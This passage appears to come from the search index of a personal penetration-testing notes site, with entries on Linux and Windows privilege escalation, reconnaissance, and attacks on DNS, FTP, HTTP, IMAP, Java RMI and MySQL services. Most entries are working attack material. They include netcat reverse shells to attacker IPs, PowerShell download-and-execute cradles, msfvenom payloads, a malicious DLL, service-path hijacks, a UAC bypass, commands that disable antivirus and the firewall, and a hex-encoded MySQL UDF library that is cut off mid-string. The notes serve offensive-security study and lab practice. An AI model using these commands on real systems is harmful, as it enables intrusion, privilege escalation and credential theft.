-c 'import os; os.setuid(0); os.system(\" bin bash\")' References: https: github.com swisskyrepo PayloadsAllTheThings blob master Methodology%20and%20Resources Linux%20-%20Privilege%20Escalation.md https: sushant747.gitbooks.io total-oscp-guide content privilege_escalation_-_linux.html https: payatu.com guide-linux-privilege-escalation https: www.hackingarticles.in lxd-privilege-escalation https: int0x33.medium.com day-67-tar-cron-2-root-abusing-wildcards-for-tar-argument-injection-in-root-cronjob-nix-c65c59a77f5e https: book.hacktricks.xyz linux-unix privilege-escalation https: unit42.paloaltonetworks.com usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop https: www.hackingarticles.in linux-privilege-escalation-using-capabilities"
					}

					
				
			
		
			
				
					,
					

					"privilege-escalation-run-commands-as": {
						"id": "privilege-escalation-run-commands-as",
						"title": "Run Commands As",
						"category": "",
						"url": " /privilege-escalation/run-commands-as/",
						"content": "Some times we need to do a lateral or vertical movement between the same hosts only switching between local users, and we cant use any type of authenticated service such as SMB or SSH. Linux Linux has the easiest way to change between users using the su command. su user To change to root user (need to be in sudoer group) sudo su - Windows Cmd runas command gives us the oportunity in cmd the opportunity to run some commands as other users. runas user:username &lt;program&gt; runas user:domain\\username &lt;program&gt; runas user:username@domain &lt;program&gt; PsExec PsExec is part of a growing kit of Sysinternals command-line tools that aid in the administration of local and remote systems named PsTools. psexec.exe accepteula psexec.exe [\\\\COMPUTER] u USER p PASS cmd [args] Powershell $user='WORKGROUP\\User'; $pass='passwd'; Invoke-Command -ScriptBlock { iex(New-Object Net.WebClient).DownloadString('http: &lt;IP&gt;:&lt;PORT&gt; rev_shell.ps1') } -ComputerName BART -Credential (New-Object System.Management.Automation.PSCredential $user,(ConvertTo-SecureString $pass -AsPlainText -Force)) NetBSD Similar like sudo su user Similar like sudoto change to rootuser: doas -u USER sh"
					}

					
				
			
		
			
				
					,
					

					"privilege-escalation-windows-privesc": {
						"id": "privilege-escalation-windows-privesc",
						"title": "Windows Privesc",
						"category": "",
						"url": " /privilege-escalation/windows-privesc/",
						"content": "Privilege Escalation usually involves going from a lower permission to a higher permission. Enumeration Scripts: There are some scripts that could help us in order to escalate privilege on Linux systems. These are two examples: PowerUp.ps1: https: github.com PowerShellMafia PowerSploit tree master Privesc Invoke-AllChecks WinPEAS: https: github.com carlospolop privilege-escalation-awesome-scripts-suite tree master winPEAS .\\WinPEAS.exe .\\WinPEAS.bat BeRoot: https: github.com AlessandroZ BeRoot .\\beRoot.exe Privesc: https: github.com enjoiz Privesc Invoke-PrivEsc Info: https: gist.github.com HarmJ0y 184f9822b195c52dd50c379ed3117993 Kernel Vulnerabilities We can exploit some kernel vulnerabilities in order to privesc. All Windows Server 2008 R2 without HOTFIXES are vulenrable to MS15 and MS16 (MS15-051) Sherlock.ps1 Is a powershell script that we can run out of memory in order to find some vulnerabilities. First we need to modify it and add the following line to the end of the script: Find-AllVulns Once added, we just need to start http server and executed directly from powershell. powershell.exe IEX(New-Object System.Net.Webclient).DownloadString('http: ip-addr:port Sherlock.ps1') https: github.com rasta-mouse Sherlock blob master Sherlock.ps1 Suggester windows-exploit-suggester.py or wesng are amazing scripts that do this work. https: github.com AonCyberLabs Windows-Exploit-Suggester Remember to update the database. . windows-exploit-suggester.py --update We just need to execute systeminfo and save the output into a file on the windows target machine. systeminfo &gt; systeminfo.txt Once downloaded to our attacking machine we just need to execute the following command: . windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo systeminfo.txt Compiling Exploits Sometimes we need to compile our exploits in order to get the binary or executable. For 64-bits: x86_64-w64-mingw32-gcc exploit.c -o exploit.exe For 32-bits: i686-w64-mingw32-gcc exploit.c -o exploit.exe MS09-20 opt windows-kernel-exploits MS09-020 MS09-020-KB970483-CVE-2009-1535-IIS6 IIS6.0.exe Usage: .\\IIS6.0.exe \"c:\\windows\\temp\\nc.exe -e cmd.exe 10.10.14.15 4444\" MS15-051 opt windows-kernel-exploits MS15-051 MS15-051-KB3045171 MS15-051.exe Usage: .\\ms15-051.exe \"c:\\windows\\temp\\nc.exe -e cmd.exe 10.10.14.15 4444\" MS16-032 opt windows-kernel-exploits MS16-032 x64 ms16-032.exe Usage: .\\ms16-032.exe MS17-010 (EternalBlue) https: github.com dful MS17-010 COMahawk (CVE-2019-1405) .\\COMahawk.exe \"C: windows temp rev.exe\" We can check the windows version by using winver command (GUI needed). https: www.exploit-db.com exploits 47684 Windows XP SP0 SP1 - upnphost sc config upnphost binpath= \"C:\\Inetpub\\wwwroot\\nc.exe 10.10.10.10 4444 -e C:\\WINDOWS\\System32\\cmd.exe\" sc config upnphost obj= \".\\LocalSystem\" password= \"\" sc qc upnphost sc config upnphost depend= \"\" net start upnphost Maybe it will fail due to missing some dependency, try the following: sc config SSDPSRV start=auto net start SSDPSRV net stop upnphost net start upnphost sc config upnphost depend=\"\" Alert: SPACES are mandatory to the work of the exploit. https: sohvaxus.github.io content winxp-sp1-privesc.html Check privileges With the following command we can check the privileges that is assigned to the pwned user: whoami priv SeImpersonatePrivilege RottenPotato (Juicy Potato) Juicy Potato is another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\\SYSTEM. Is a sugared version of Rotten Potato. Download the latest realese and execute it. .\\JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a \" c c:\\windows\\temp\\nc.exe -e cmd.exe 10.10.14.21 4444\" -t * PrintSpoofer One way to gain system user on latest Operative System such as Windows10 or Server 2016 2019, is using the printspoofer exploit. Donwload the latest release and execute it on the target machine to gain privs. PrintSpoofer64.exe -i -c cmd SeLoadDriverPrivilege We are able to load a driver, so we can load a vulnerable driver, then exploit it. Load Capcom.sys To load the driver we need first to create a C++ Console APP on Visual Studio (Not Code!) and paste the following script. Alert: Remove line: #include “stdafx.h” https: raw.githubusercontent.com TarlogicSecurity EoPLoadDriver master eoploaddriver.cpp Once compiled With Release x64 we need to download Capcom.sys driver. (https: github.com FuzzySecurity Capcom-Rootkit blob master Driver Capcom.sys) Copy the driver and the binary to the target machine and execute it. .\\EoPLoadDriver.exe System\\CurrentControlSet\\dfserv C:\\ProgramData\\Capcom.sys [+] Enabling SeLoadDriverPrivilege [+] SeLoadDriverPrivilege Enabled [+] Loading Driver: \\Registry\\User\\S-1-5-21-2633719317-1471316042-3957863514-1104\\System\\CurrentControlSet\\dfserv NTSTATUS: 00000000, WinError: 0 NTSTATUS codes: 0xC000003B - STATUS_OBJECT_PATH_SYNTAX_BAD 0x00000034 - STATUS_OBJECT_NAME_NOT_FOUND Exploiting Capcom.sys I modified the following project: https: github.com tandasat ExploitCapcom. Download the project and open the ExploitCapcom.sln (Visual Studio Project) with Visual Studio. Modify the line 410 of ExpliotCapCom.cpp and compile it. Create the exploit.exe payload with msfvenom: msfvenom -a x86 -p windows shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; exploit.exe And upload all the files and execute the ExploitCapcom.exe: .\\ExploitCapcom.exe https: www.tarlogic.com en blog abusing-seloaddriverprivilege-for-privilege-escalation Unquoted Service Path Every Windows service has his access route to the executable. If this route is not quoted and contains spaces or others separators like this example C:\\Program Files\\First Folder\\myexecutable.exe , the service will try to access to the resource in the following order: C:\\Program.exe C:\\Program Files\\First.exe C:\\Program Files\\First Folder\\myexecutable.exe If we can put our executable in one of the paths that it is checked before the real route, when we restart the service we will obtain a shell. wmic service get name,pathname,displayname,startmode | findstr i auto | findstr i v \"C:\\Windows\\\\\" | findstr i v '\"' Get-WmiObject -Class win32_service | select pathname With PowerUp we can list services with unquoted paths and a space in their name. Get-ServiceUnquoted -Verbose We need to ensure that the service is running by LocalSystem: sc qc &lt;service&gt; Once we’ve found the binaries that are vulnerable to unquoted service path, we need to find where we have permissions to write, for that work we can use icacls: icacls \"C:\\Porgram Files\" Info: We need to find some with write permissions (W) Once we’ve found the writeable path, we will need to create our malicious binary with msfvenom and upload in the right directory: msfvenom -p windows shell_reverse_tcp LHOST=&lt;ip-addr&gt; LPORT=&lt;port&gt; -f exe -o First.exe Finally we need to restart the service to gain access to system: sc stop &lt;service&gt; sc start &lt;service&gt; Always Install Elevated If these 2 registers are enabled (value is 0x1), any user can install .msi ** files as NT AUTHORITY\\SYSTEM** reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer v AlwaysInstallElevated reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer v AlwaysInstallElevated Creating the malicious .msi file msfvenom -p windows x64 shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt;-f msi -o shell.msi Executing the .msi msiexec quiet qn i c:\\users\\user\\documents\\shell.msi Note: I’d problems while exploiting it via WIN-RM. Try another way to get shell. Incorrect permissions in services A service running as NT AUTHORITY SYSTEM with incorrect file permissions might allow to escalate privileges. You can replace the binary, restart the service and get system. net start wmic service list brief sc query Get-Service With PowerUp we can get the services where the current user can write to its binary path or change arguments to the binary. Get-ModifiableServiceFile -Verbose We can also chec the services whose configuration the current user can modify. Get-ModifiableService -Verbose Sometimes services are pointing to writeable folders: Writeable Folders Check permissions on folders. C:\\&gt;icacls exacqVisionEsm icacls exacqVisionEsm exacqVisionEsm NT AUTHORITY\\NETWORK SERVICE:(RX) S-1-5-21-1861402468-3453913150-4246083462-1001:(RX) BUILTIN\\Administrators:(I)(OI)(CI)(F) NT AUTHORITY\\SYSTEM:(I)(OI)(CI)(F) BUILTIN\\Users:(I)(OI)(CI)(RX) NT AUTHORITY\\Authenticated Users:(I)(M) NT AUTHORITY\\Authenticated Users:(I)(OI)(CI)(IO)(M) Permissions: Full access (F): Change the binary to the malicious one. PRIV PATH Modify access (M) : Rename the binary to bin.bak and copy the malicious binary to the original path bin.exe. PRIV PATH Read and Execute access (RX): Can read and execute, nothing here. Read-only acess (R): Only can read, nothing here. Write-only acess (W): Only can write, same as (F), change the binary to the malicious one. PRIV PATH Changing the original binary: msfvenom -p windows shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe -o mal.exe move .\\enterprisesystemmanager.exe .\\enterprisesystemmanager.bak move C:\\Windows\\Temp\\rev.exe .\\enterprisesystemmanager.exe Check the configuration of the service to see how to restart the service. sc qc \"exacqVision Enterprise System Manager Web Service\" Restart Manually If you have sufficient permissions over the service restart it manually. net stop ServiceName net start ServiceName AUTO_START enabled If AUTO_START flag is enabled restart the machine shutdown r DLL Hijacking When we have permissions to overwrite the DLL or the DLL is missing we can create ours. Msfvenom A dll can also be created with msfvenom. msfvenom -p windows shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f dll -o mal.dll Manual DLL The following C code is an example of our malicious dll. #include &lt;windows.h&gt; BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) { if (dwReason == DLL_PROCESS_ATTACH) { system(\"cmd.exe c:\\Temp\\nc.exe -e cmd.exe &lt;IP&gt; &lt;PORT&gt;\"); ExitProcess(0); } return TRUE; } Compiling the DLL #x64 x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll #x86 i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll Modifying the service Check service permissions with accesschk from sysinternals. accesschk -c &lt;service&gt; -l And finally modify it. sc stop &lt;service&gt; sc config &lt;service&gt; binPath=\"C:\\Temp\\nc.exe -e cmd.exe &lt;IP&gt; &lt;PORT&gt;\" sc qc &lt;service&gt; #Check correct assigment sc start &lt;service&gt; WSL (Windows Subsystem for Linux) Windows Subsystem for Linux is a compatibility layer for running Linux binary executables natively on Windows 10 and Windows Server 2019. Location: C:\\Windows\\System32\\wsl.exe Executing wsl.exe we can get a subsystem shell (Linux) or we can search the subsystem fileroot on the windows machine. C:\\Users\\User\\AppData\\Local\\Packages\\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\\LocalState\\rootfs\\ Inside the Linux filesystem as root, you can search for passwords or some other interesting things. From Administrator to System As it is known the maximum privilege account of windows systems is NT AUTHORITY\\SYSTEM , so we need to spawn a shell with that account. Once our user is already on Administrators group, we can check it with different forms: net user admin net sessions #only can execute local administrators There are different forms to spawn a system shell, but I will explain one, creating a service. sc create &lt;service_name&gt; binpath= \"C:\\Users\\User\\nc.exe &lt;ip-addr&gt; &lt;port&gt; -e cmd.exe\" type= own type= interact After starting our new service we will get the System shell on our handler: sc start &lt;service_name&gt; Windows Scheduler Similar to crontab, Windows Scheduler is a component of Microsoft Windows that provides the ability to schedule the launch of programs or scripts at pre-defined times. If you found some of this running proceses tasklist, maybe you need to take a look: WScheduler.exe WService.exe # Some other binary that starts with WS (WindowsScheduler) So we will examinate the Events System Sheduler directory: C:\\Program Files (x86)\\SystemScheduler\\Events Find some logs files to see which program is scheduled, and replace the binary with yout malicious one. Bypass UAC User Account Control (UAC) is an access control system that forces applications and tasks to run in the context of a non-administrative account until an administrator authorizes elevated access. Mandatory Levels Exists three types of Mandatory Level: whoami all GROUP INFORMATION ----------------- Group Name Type SID Attributes =================================== ================ ============ ================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Remote Desktop Users Alias S-1-5-32-555 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\INTERACTIVE Well-known group S-1-5-4 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group LOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\\Low Mandatory Level Unknown SID type S-1-16-4096 Mandatory group, Enabled by default, Enabled group Low Mandatory Level: Services like IE has no permissions, it can not write on any directory, but IE for example need to write cache on a directory. So with Low Mandatory Level we will only able to write data on the following path. C:\\Users\\Victim\\AppData\\LocalLow Medium Mandatory Level: Permissions as a normal user. High Mandatory Level: Permissions as NT AUTHORITY SYSTEM. UAC can be bypassed in various ways. fodhelper.exe fodhelper.exe is a Microsoft support application responsible for managing language changes in the operating system. This binary runs as high integrity on Windows 10. With sigcheck.exe from SysInternals is posible to inspect the application manifest. sigcheck.exe -a -m C:\\Windows\\System32\\fodhelper.exe Note: Search for requestedExecutionLevel as requireAdministrator and autoElevate in true. First we need to add some registries with REG: REG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command REG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command v DelegateExecute t REG_SZ REG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command d \"cmd.exe\" f Antivirus and Firewall Antivirus Check status: Get-MpComputerStatus Need NT AUTHORITY SYSTEM rights if the UAC is enabled. net stop WinDefend If it is not possible login via RDP with an Administrator user and disable it manually. Firewall Disable firewall by executing: netsh advfirewall set allprofiles state off Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False References https: medium.com @SumitVerma101 windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae https: blog.geoda-security.com 2017 06 elevate-from-admin-to-nt-authoritysystem.html https: itm4n.github.io printspoofer-abusing-impersonate-privileges https: github.com swisskyrepo PayloadsAllTheThings blob master Methodology%20and%20Resources Windows%20-%20Privilege%20Escalation.md#cve-2019-1388 https: kb.digital-detective.net display BF Understanding+and+Working+in+Protected+Mode+Internet+Explorer#:~:text=A%20Low%20integrity%20process%2C%20like,files%20in%20low%20integrity%20folders."
					}

					
				
			
		
			
				
					,
					

					"reconnaissance-information-gathering": {
						"id": "reconnaissance-information-gathering",
						"title": "Information Gathering",
						"category": "",
						"url": " /reconnaissance/information-gathering/",
						"content": "Information Gathering is the act of gathering different kinds of informationagainst the targeted victim or system. There are two types of information gathering, passive or OSINT (Open Source INTelligence) information gathering which means gathering as much information about our target wihout exposing our presence, and active information gathering which techniques interact directly with the target system. Passive Information Gathering (OSINT) Is a technique to gather information without any interaction with the target. There are many tools that are listed in OSINT Framework. OSINT Framework The OSINT Framework includes information gathering tools and websites in one central location. Some tools listed in the framework cover more disciplines than information security. https: osintframework.com Search Engines Google offers the opportunity to perform advanced search queries using special operators: AND, OR, +, -, \"\" And this is some examples of queries: Query Type Google Dork Cache cache:www.example.com Link link:www.example.com Site site:www.website.com Filetype filetype:pdf Title intitle:index.of Harvesting Harversting is extract information from documents and files. We can find information such as emails, workers and so on. theHarvester is a tool that automates this working theharvester -d example.com -b google theharvester -d example.com -b linkedin Social Media The spread of social networks has made information gathering extremely important and effective. With the help of social media, a pentester can esaily gather employee’s personal informacion such as phone numbers, addresses, history and CV. We want to collect the following information about the employees: Age Phone Number Addresses Occupation Business Interests Email Addresses Website Owned Related Documents Financial Info Infrastructures The main goal here is to retrieve data such as: Domains Netblocks or IP addresses Mail servers ISP’s used (Internet Server Provider) Any other technical information Domains and subdomains Given a domain, the first source for information is WHOIS. There are a lot of online tools that allow you top use WHOIS: http: who.is http: whois.domaintools.com https: www.betterwhois.com https: searchdns.netcraft.com There are some tools that search subdomains like amass or sublist3r: sublist3r -d [Domain] amass enum -d example.com Nmmapper is an online tool that finds a lots of subdomains: https: www.nmmapper.com sys tools subdomainfinder The following user guide helps us a lot to inspect some awesome queries. https: github.com OWASP Amass blob master doc user_guide.md Recon-ng Recon-ng is a moduled-base framework for web-based information gathering. Recon-ng displays the results of a module to the terminal but it also stores them in a database. Searching Modules We can add modules from the recon-ng with marketplace. marketplace search &lt;MODULE&gt; marketplace info &lt;MODULE&gt; marketplace install &lt;MODULE&gt; Using Modules We need to load the module before using it: marketplace load &lt;MODULE&gt; info options set &lt;OPTION&gt; &lt;VALUE&gt; Display results We can display some different results, since hosts to vulnerabilities. show #To see all posibilities of displaying show &lt;SELECTION&gt; Best Recon-ng Modules recon domains-hosts google_site_web #Search subdomains on Google with Google Dorks recon hosts-hosts resolve #Update hosts table with the DNS resolution Shodan As we gather information on our target, it is important to remember that traditional websites are just one part of the internet. Shodan is a search engine that crawls devices connected to the internet. The following repository gives us some examples of what we can do with this brilliant tool https: github.com jakejarvis awesome-shodan-queries Open-Source Code One such of interesting information are open-source projects and online code repositories, such as GitHub, GitLab and SourceForge. GitLeaks Gitleaks is a SAST tool for detecting hardcoded secrets like passwords, api keys, and tokens in git repos. Gitleaks is an easy-to-use, all-in-one solution for finding secrets, past or present, in your code. gitleaks --repo-url=https: github.com my-insecure repo -v https: github.com zricethezav gitleaks"
					}

					
				
			
		
			
				
					,
					

					"services-dns": {
						"id": "services-dns",
						"title": "PORT 53/tcp - DNS",
						"category": "",
						"url": " /services/dns/",
						"content": "The Domain Name System (DNS) is the phonebook of the Internet. Humans access information online through domain names, like nytimes.com or espn.com. Introduction In this section only will be shown the methodology to enumerate locally the DNS service. If you need to take a look of DNS enumeration vía internet, you will found in the following section. Information Gathering DNS queries produce listing calls Resource Records. This is a representation of Resource Records: Enumeration First we will need to a Reverse DNS Lookup, With Reverse DNS Lookup, we will receive the IP address associated to a given domain name. # With nslookup nslookup &gt; server IP_DNS_SERVER &gt; IP # With dig dig -x IP @IP_DNS_SERVER There are usually two name servers. Take note of both of them an run the next command to show all A records: nslookup -query=AXFR [Domain] [Nameserver] dig axfr DOMAIN.LOCAL @IP_DNS_SERVER Finally, just add the DNS records to you etc hosts."
					}

					
				
			
		
			
				
					,
					

					"services-ftp": {
						"id": "services-ftp",
						"title": "PORT 21/tcp - FTP",
						"category": "",
						"url": " /services/ftp/",
						"content": "Introduction FileZilla Server (From LFI) FileZilla Server credentials FileZilla Server credentials are stored on the FileZilla Server.xml file stored in one of the following routes: C:\\Program Files (x86)\\FileZilla Server\\FileZilla Server.xml C:\\Program Files\\FileZilla Server\\FileZilla Server.xml C:\\xampp\\FileZillaFTP\\FileZilla Server.xml Some times we can found it on plain text (base64) and sometimes encrypted. To decrypt we can use the following tool: python filezilla-decrypt.py --wordlist usr share wordlists rockyou.txt Note: You need to modify password and salt variables of the python script and unescape the salt. &amp;amp; = &amp; &amp;lt; = &lt; &amp;apos; = ' &amp;quot; = \" &amp;gt; = &gt; # Example Escaped: `!U3`CQ;a&amp;amp;3IzbXc 4Wpb\\)OZ3TsXP;&amp;apos;Wx#^K&amp;quot;Tu_XX.K&amp;apos;o&amp;lt;&amp;apos;c&amp;amp;A:vItTX-M|Z0Y Unescaped: `!U3`CQ;a&amp;3IzbXc 4Wpb\\)OZ3TsXP;'Wx#^K\"Tu_XX.K'o&lt;'c&amp;A:vItTX-M|Z0Y https: github.com l4rm4nd FileZilla-Password-Decryptor FileZilla client credentials FileZilla client save last saved credentials on the following link. C:\\Users\\VICTIM\\AppData\\Roaming\\FileZilla\\RecentServers.xml"
					}

					
				
			
		
			
				
					,
					

					"services-http": {
						"id": "services-http",
						"title": "PORT 80/tcp, 443/tcp - HTTP Server",
						"category": "",
						"url": " /services/http/",
						"content": "It is a brief methodology to use in front of web applications. Scanning First of all we need to scan the ports and use some enumerating tools such as nmap, nikto or davtest. Nmap Search for vulns: nmap -p 80,443 -sV -sC --script=http-vuln* 10.10.10.10 Search for info: nmap -p 80,443 -sV -sC 10.10.10.10 Nikto Nikto is a free software command-line vulnerability scanner that scans webservers for dangerous files CGIs. nikto -host 10.10.10.10:80 Davtest DAVTest tests WebDAV enabled servers by uploading test executable files, and then (optionally) uploading files which allow for command execution or other actions directly on the target. davtest --url http: 10.10.10.10 Fuzzing In the world of cybersecurity, fuzz testing (or fuzzing) is an automated software testing technique that attempts to find hackable software bugs by randomly feeding invalid and unexpected inputs and data into a computer program in order to find coding errors and security loopholes. This technique is also used to discover new web content such as directories, files or parameters. There are many different tools that could help us to do fuzzing in web applications (wfuzz, ffuf, dirb, dirbuster…). But I’m going to use wfuzz and ffuf. Directory Fuzzing Wordlist: usr share wordlist dirbuster directory-list-2.3-medium.txt usr share seclists Discovery Web-Content raft-medium-directories.txt usr share seclists Discovery Web-Content raft-medium-words.txt #IIS Server usr share seclists Discovery Web-Content raft-medium-directories-lowercase.txt usr share seclists Discovery Web-Content raft-medium-words-lowercase.txt Note: IIS server is non-case sensitive Command: gobuster dir -w wordlists.txt -x 'asp,aspx,html' -b 404 -u http: SEVER_IP:PORT ffuf -w wordlists.txt:FUZZ -e .php,.html-.aspx -u http: SERVER_IP:PORT FUZZ -recursion -recursion-depth 1 dirb http: SERVER_IP:PORT wfuzz -Z -c -w wordlists.txt -z list,-.asp-.aspx-.html --hc 404 http: SERVER_IP:PORT FUZZFUZ2Z Vhost Fuzzing Wordlists: opt SecLists Discovery DNS subdomains-top1million-5000.txt usr share seclists Discovery DNS shubs-subdomains.txt Command for different hosts: ffuf -w opt SecLists Discovery DNS subdomains-top1million-5000.txt:FUZZ -u https: FUZZ.example.com Command for the same host: wfuzz -Z -c -w usr share seclists Discovery DNS shubs-subdomains.txt -H \"Host: FUZZ.example.com\" --hh &lt;length&gt; http: ip-addr Parameter Fuzzing Wordlist: opt SecLists Discovery Web-Content burp-parameter-names.txt GET ffuf -w opt SecLists Discovery Web-Content burp-parameter-names.txt:FUZZ -u http: example.com admin admin.php?FUZZ=key -fs xxx POST ffuf -w opt SecLists Discovery Web-Content burp-parameter-names.txt:FUZZ -u http: example.com admin admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application x-www-form-urlencoded' -fs xxx Default Installation Routes These are some default installation routes of Linux and Windows webservers. Linux var www html Windows C:\\xampp\\htdocs\\ C:\\inetpub\\wwwroot\\"
					}

					
				
			
		
			
				
					,
					

					"services-imap": {
						"id": "services-imap",
						"title": "PORT 143/tcp, 993/tcp - IMAP",
						"category": "",
						"url": " /services/imap/",
						"content": "Internet Message Access Protocol (IMAP) In computing, the Internet Message Access Protocol (IMAP) is an Internet standard protocol used by email clients to retrieve email messages from a mail server over a TCP IP connection. IMAP is defined by RFC 3501. By default, the IMAP protocol works on two ports: Port 143 - this is the default IMAP non-encrypted port Port 993 - this is the port you need to use if you want to connect using IMAP securely Connection to IMAP server We can established our connection to both ports, non-encrypted or encypted. # Non-encrypted connection telnet imap.server.local 143 # Encrypted connection openssl s_client -crlf -connect imap.server.local:993 Login To take a look to victims mailboxes, we obviously need their creds. A1 LOGIN user@server.local password tag LOGIN user@server.local password Note: Sometimes the user does not contains the domain. List Mailboxes To list mailboxes run the following command. A1 LIST \"\" * tag LIST \"\" * Select a Mailbox After getting the existant mailboxes we need to choose one. A1 SELECT \"[INBOX]\" tag SELECT \"[INBOX]\" Mailbox status With status command, we can see the total of non-read messages, sent messages and more over. A1 STATUS \"[INBOX]\" (MESSAGES) tag STATUS \"[INBOX]\" (MESSAGES) Fetch headers of all messages Fetch command gives us the ability to read the messages. A1 FETCH 1:* (BODY[HEADER]) tag FETCH 1:* (BODY[HEADER]) Fetch message body To see the body of the message we need to set up the flag BODY as argument. #Non-multipart messages A1 FETCH [Message] (BODY) tag FETCH [Message] (BODY) #Multipart messages (Normaly plain text -&gt; n=1) A1 FETCH [Message] (BODY[n]) tag FETCH [Message] (BODY[n]) Logout Finally, when we finish out job we need to logout to close the connection. A1 LOGOUT tag LOGOUT References: https: tewarid.github.io 2011 05 10 access-imap-server-from-the-command-line-using-openssl.html https: book.hacktricks.xyz pentesting pentesting-imap"
					}

					
				
			
		
			
				
					,
					

					"services-java-rmi": {
						"id": "services-java-rmi",
						"title": "PORT 1100/tcp - Java RMI",
						"category": "",
						"url": " /services/java-rmi/",
						"content": "The Java Remote Method Invocation, or Java RMI, is a mechanism that allows an object that exists in one Java virtual machine to access and call methods that are contained in another one. Enumeration We can enumerate RMI ports with nmap. nmap -sV --script \"rmi-dumpregistry or rmi-vuln-classloader\" -p &lt;PORT&gt; &lt;IP&gt; &lt;PORT&gt; tcp open java-rmi Java RMI | rmi-dumpregistry: | creamtec ajaxswing JVMFactory | com.creamtec.ajaxswing.core.JVMFactory_Stub | @127.0.0.1:49157 | extends | java.rmi.server.RemoteStub | extends |_ java.rmi.server.RemoteObject BaRMIe.jar If we can dump the registry of the java-rmi instance is the case where the machine may be vulnerable to a deserialization exploit. To exploit this deserialization on RMI ports I’m going to use BaRMIe.jar. We can download the file on the following link. https: github.com NickstaDB BaRMIe releases download v1.01 BaRMIe_v1.01.jar You need to select some parameters such as target, attack, payload and OS command, here and example of usage with a nishang reverse shell. I used Apache Commons for payload but you can use one different. $ java -jar BaRMIe_v1.01.jar -attack &lt;IP&gt; &lt;PORT&gt; Target summary: &lt;IP&gt;:&lt;PORT&gt; Available attacks: [---] Java RMI registry illegal bind deserialization Target selection 1) &lt;IP&gt;:&lt;PORT&gt; Reliability [---], Deser attack [Y], payload [?] Select a target to attack (q to quit): 1 Available attacks for target: &lt;IP&gt;:&lt;PORT&gt; 1) [---] Java RMI registry illegal bind deserialization Select an attack to execute (b to back up, q to quit): 1 Attack: Java RMI registry illegal bind deserialization [---] Deserialization payloads for: &lt;IP&gt;:&lt;PORT&gt; 1) Apache Commons Collections 3.1, 3.2, 3.2.1 2) Apache Commons Collections 4.0-alpha1, 4.0 3) Apache Groovy 1.7-beta-1 to 2.4.0-beta-4 4) Apache Groovy 2.4.0-rc1 to 2.4.3 5) JBoss Interceptors API 6) ROME 0.5 to 1.0 7) ROME 1.5 to 1.7.3 8) Mozilla Rhino 1.7r2 9) Mozilla Rhino 1.7r2 for Java 1.4 10) Mozilla Rhino 1.7r3 11) Mozilla Rhino 1.7r3 for Java 1.4 12) Mozilla Rhino 1.7r4 and 1.7r5 13) Mozilla Rhino 1.7r6, 1.7r7, and 1.7.7.1 a) Try all available deserialization payloads Select a payload to use (b to back up, q to quit): 1 Enter an OS command to execute: powershell.exe -command \"IEX(new-object net.webclient).downloadstring('http: &lt;ip-kali&gt; Invoke-PowerShellTcp.ps1')\""
					}

					
				
			
		
			
				
					,
					

					"services-mysql": {
						"id": "services-mysql",
						"title": "PORT 3306/tcp - MySQL Server",
						"category": "",
						"url": " /services/mysql/",
						"content": "Privilege Escalation Once we have a database user, some configuration is needed to be checked. Grants Look what privileges have the user. show GRANTS; Variables Take a look to the defined variables, sometimes has valuable information. show VARIABLES; show VARIABLES LIKE '%version%'; show VARIABLES LIKE '%plugin_dir%'; show VARIABLES LIKE '%tmp%'; show VARIABLES LIKE '%hostname%'; RCE via Library (lib_mysqludf_sys.so) To do that task mysql root user is needed or another user with FILE permissions. Shellcode (@shell) 32 bits: x86 0x7f454c4601010100000000000000000003000300010000007009000034000000581200000000000034002000040028001900180001000000000000000000000000000000f80e0000f80e00000500000000100000010000000010000000100000001000000801000010010000060000000010000002000000141000001410000014100000d0000000d0000000060000000400000051e5746400000000000000000000000000000000000000000600000004000000250000002a0000001400000008000000270000001d0000000000000000000000030000000000000011000000000000000a0000002900000012000000200000000000000000000000260000000c0000002100000017000000230000000d000000000000000e0000001c000000150000000000000006000000000000000000000010000000220000000f0000002400000019000000180000000000000000000000000000000000000000000000000000001a0000000200000013000000050000000000000000000000000000000000000000000000000000001f00000001000000280000000000000000000000000000000000000000000000070000002500000016000000000000000b00000000000000000000000000000000000000000000001e0000001b0000000000000000000000090000000000000000000000040000000000000011000000130000000400000007000000010804409019c7c9bda4080390046083130000001500000016000000180000001a0000001c0000001f00000021000000000000002200000000000000230000002400000026000000280000002900000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe1200000000000000000000000000000000e7000000000000008d00000012000000c2000000000000005c00000012000000ba00000000000000e7040000120000000100000000000000000000002000000025000000000000000000000020000000ed000000000000007e02000012000000ab01000000000000150100001200000079010000000000007d00000012000000c700000000000000c600000012000000f50000000000000071010000120000009e